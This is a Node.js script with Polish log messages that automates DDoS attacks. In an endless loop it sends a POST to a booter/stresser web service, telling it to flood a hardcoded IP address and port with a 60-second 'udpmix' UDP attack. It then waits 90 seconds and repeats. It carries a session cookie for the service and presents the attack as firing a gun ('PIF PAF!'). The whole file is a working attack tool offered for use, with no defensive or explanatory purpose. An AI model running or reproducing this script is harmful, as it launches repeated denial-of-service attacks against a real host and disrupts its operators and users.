const request = require('request-promise');

class Main {

  constructor () {
    this.run();
  }

  async run () {
    while (true) {
      await this.pifpaf();
      await this.wait(90); 
    }
  }

  async pifpaf () {

    console.log('Przeładowywanie...');

    try {

      const data = await request({
        method: 'POST',
        uri: 'https://www.stressthem.to/booter?handle',
        body: {
          method_l4: 'udpmix',
          options: null,
          host: '185.129.113.221',
          port: 54577,
          time: 60,
        },
        json: true,
        headers: {
          'Cookie': 'referrer=https%3A%2F%2Fwww.google.com%2F; UID=a9ae1eca-9298-44d5-abd0-0c66a9ab4b48',
        },
        timeout: 900000,
      });
  
      console.log('PIF PAF!');

    } catch (error) {
      
      console.log('Kula utknęła w magazynku...');
      console.log(error);

    }

  }

  wait (seconds) {
    return new Promise((resolve) => {
      setTimeout(() => {
        resolve();
      }, seconds * 1000);
    });
  }

}

module.exports = new Main();
